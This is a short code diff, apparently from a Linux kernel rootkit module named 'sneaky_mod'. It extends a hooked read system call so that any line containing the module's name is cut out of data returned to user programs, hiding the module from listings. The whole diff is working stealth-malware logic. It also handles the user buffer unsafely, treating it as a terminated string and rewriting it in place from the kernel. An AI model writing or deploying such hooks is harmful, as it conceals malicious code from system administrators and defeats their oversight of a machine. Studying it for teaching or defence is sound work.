@@ -99,8 +99,31 @@ asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
   ssize_t nread;
+  char *line_start, *line_end;
   printk(KERN_INFO "getting into sneaky_sys_read\n");
+
+  line_start = NULL;
+  line_end = NULL;
   nread = original_read(fd, buf, count);
+  if (nread == -1) {
+    printk(KERN_INFO "error: cannot operate original read");
+  }
+  if (nread == 0) {
+    return 0;
+  }
+
+  line_start = strstr(buf, "sneaky_mod");
+  if (line_start != NULL) {
+    for (line_end = line_start; line_end < (char *)(nread + buf); line_end++) {
+      if (*line_end == '\n') {
+        line_end++;
+        break;
+      }
+    }
+    memcpy(line_start, line_end, (char *)(buf + nread) - line_end);
+    nread -= (ssize_t)(line_end - line_start);
+  }
+
   return nread;
 }
 
